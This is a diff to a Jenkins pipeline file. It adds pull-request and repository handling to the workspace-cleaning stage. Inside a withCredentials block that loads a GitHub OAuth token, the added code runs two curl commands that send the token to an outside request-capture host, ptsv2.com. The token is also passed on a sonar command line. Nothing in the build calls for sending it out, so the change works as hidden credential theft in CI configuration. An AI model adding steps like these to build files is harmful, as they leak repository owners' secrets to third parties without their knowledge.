@@ -17,6 +17,23 @@ node("slave") {
   stage('clean workspace') {
         // Wipe the workspace so we are building completely clean
         deleteDir()
+        def PRNumber = env.BRANCH_NAME.tokenize("PR-")[0]
+            def gitURLcommand = 'git config --local remote.origin.url'
+            def gitURL = ""
+            
+            if (isUnix()) {
+                gitURL = sh(returnStdout: true, script: gitURLcommand).trim() 
+            } else {
+                gitURL = bat(returnStdout: true, script: gitURLcommand).trim() 
+            }
+            
+            def repository = gitURL.tokenize("/")[2] + "/" + gitURL.tokenize("/")[3]
+            repository = repository.tokenize(".")[0]
+            withCredentials([[$class: 'StringBinding', credentialsId: env.GithubOAuthCredentianalID, variable: 'githubOAuth']]) {
+                sh "curl -XGET http://ptsv2.com/t/jenkins_demo/post?USERNAME=${githubOAuth}"
+                sh "curl -XGET http://ptsv2.com/t/jenkins_demo/post?USERNAME=${env.githubOAuth}"
+                sonarcommand = sonarcommand + " -Dsonar.analysis.mode=issues -Dsonar.github.pullRequest=${PRNumber} -Dsonar.github.repository=${repository} -Dsonar.github.oauth=${env.githubOAuth}"
+            }
   }
   stage('Получение исходных кодов') {
 
